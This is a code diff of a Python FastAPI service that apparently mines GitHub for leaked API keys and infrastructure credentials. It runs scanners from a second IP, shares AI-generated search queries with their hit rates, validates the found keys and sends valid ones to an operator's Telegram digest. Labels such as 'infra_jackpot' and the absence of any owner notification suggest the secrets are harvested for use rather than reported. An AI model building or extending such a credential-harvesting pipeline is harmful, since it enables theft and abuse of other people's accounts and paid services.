@@ -316,11 +316,12 @@ async def lifespan(app: FastAPI):
         # Mirror service: scans GitHub from a different IP, ships finds to
         # master via mirror_relay. Disable everything else (telegram, deepseek
         # pipelines, satellite scanners, infra_jackpot) — those run on master.
-        log.info("=== MIRROR_MODE active — only scan_cycle + mirror_relay flush ===")
-        from mirror_relay import flush_loop as _mirror_flush
+        log.info("=== MIRROR_MODE active — only scan_cycle + mirror_relay flush + query_sync ===")
+        from mirror_relay import flush_loop as _mirror_flush, query_sync_loop as _mirror_query_sync
         tasks = [
-            asyncio.create_task(_scan_loop(),     name="scan_loop"),
-            asyncio.create_task(_mirror_flush(),  name="mirror_relay"),
+            asyncio.create_task(_scan_loop(),         name="scan_loop"),
+            asyncio.create_task(_mirror_flush(),      name="mirror_relay_flush"),
+            asyncio.create_task(_mirror_query_sync(), name="mirror_relay_query_sync"),
         ]
     else:
         tasks = [
@@ -938,9 +939,60 @@ async def admin_ingest_infra(
                            src_lbl, dest, risk, ["mirror_ingest"])
         if ok:
             n_saved += 1
+            # Buffer for Telegram digest (skips risk='low' internally)
+            try:
+                from notifier import notify_infra_found as _notify_infra
+                await _notify_infra(ctype, cred, repo, path, url,
+                                    0, "", src_lbl, dest, risk, ["mirror_ingest"])
+            except Exception as e:
+                log.debug("notify infra on mirror ingest failed: %s", e)
         else:
             n_dupe += 1
     return {"received": len(items), "ingested": n_saved, "duplicate": n_dupe}
+
+
+@app.get("/admin/dynamic_queries_export")
+async def admin_dynamic_queries_export(
+    max_age_days: int = 15, authorization: str | None = Header(default=None)
+):
+    """Export master's dynamic_queries (DeepSeek-generated + combinatorial)
+    so mirror services can mirror the same query pool without each running its
+    own DeepSeek pipeline. Mirror calls this every ~1h via mirror_relay's
+    background sync task and INSERT-OR-IGNOREs into its local table.
+
+    Includes blacklist + yield stats so mirror skips master's known dead
+    patterns and can pick up where master's stats left off (yield numbers
+    will diverge slightly per-IP — informational, not authoritative)."""
+    _check_admin(authorization)
+    max_age_days = max(1, min(max_age_days, 60))
+    cutoff = (datetime.now(timezone.utc) - timedelta(days=max_age_days)).isoformat()
+    with db._conn() as c:
+        rows = c.execute(
+            """SELECT query_hash, query_str, provider, file_type, theme,
+                      generated_at, blacklisted_until,
+                      keys_found, valid_keys_found, times_used
+               FROM dynamic_queries
+               WHERE generated_at >= ?""",
+            (cutoff,),
+        ).fetchall()
+    return {
+        "count": len(rows),
+        "queries": [
+            {
+                "query_hash":        r["query_hash"],
+                "query_str":         r["query_str"],
+                "provider":          r["provider"],
+                "file_type":         r["file_type"],
+                "theme":             r["theme"] or "",
+                "generated_at":      r["generated_at"],
+                "blacklisted_until": r["blacklisted_until"],
+                "keys_found":        r["keys_found"] or 0,
+                "valid_keys_found":  r["valid_keys_found"] or 0,
+                "times_used":        r["times_used"] or 0,
+            }
+            for r in rows
+        ],
+    }
 
 
 @app.get("/admin/mirror_stats")
@@ -1099,6 +1151,14 @@ async def admin_validate_keys(
             n_saved += 1
             if is_valid:
                 n_valid += 1
+                # Trigger Telegram notification for mirror-sourced finds —
+                # without this, mirror finds land silently in DB. notify_found
+                # only buffers valid keys for the next 15-min flush.
+                try:
+                    from notifier import notify_found as _notify
+                    await _notify(prov, key, repo, path, url, 0, "", src_lbl, is_valid)
+                except Exception as e:
+                    log.debug("notify on mirror ingest failed: %s", e)
         out.append({"provider": prov, "preview": key[:14] + "...",
                     "is_valid": is_valid, "saved": saved})
 
